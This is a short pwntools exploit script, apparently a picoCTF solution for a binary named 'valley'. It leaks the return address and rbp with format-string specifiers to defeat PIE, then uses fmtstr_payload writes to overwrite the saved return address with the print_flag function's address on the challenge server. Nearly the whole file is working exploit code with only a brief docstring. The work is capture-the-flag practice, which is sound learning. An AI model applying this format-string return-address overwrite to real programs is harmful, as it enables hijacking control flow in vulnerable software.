"""
=== change return address with format string ===
1. rbp is pointing to address(that store return addr)+8
2. write the print_flag func addr in lower bytes and then the high bytes
3. PIE is enabled so have to calculate the base addr, with the return addr leak from format string
"""


from pwn import *
# p=process("./valley")
p=remote("shape-facility.picoctf.net" ,51023)
elf = context.binary = ELF('./valley',checksec=False)
p.sendline(b"%21$p") # return addr
p.recvuntil("distance: ")
alamat=int(p.recvline().decode().strip(), 16)
print(hex(alamat))
elf.address = alamat - int("0x1413",16) #ret addr offset

print_flag=elf.symbols["print_flag"]
low_bytes = print_flag & 0xFFFFFFFF
high_bytes = (print_flag >> 32) & 0xFFFFFFFF

p.sendline(b"%20$p") # rbp that store pointer after return addr
p.recvuntil("distance: ")
rbp_point_to=int(p.recvline().decode().strip(), 16)-8 #addr of lower bytes of return addr

writes = {rbp_point_to: low_bytes}
payload = fmtstr_payload(6, writes)
p.sendline(payload)

writes_2 = {rbp_point_to+4: high_bytes} #high addr of ret addr
payload = fmtstr_payload(6, writes_2)
p.sendline(payload)
p.sendline(b"exit") #because we're in looping, we need to return

p.interactive()
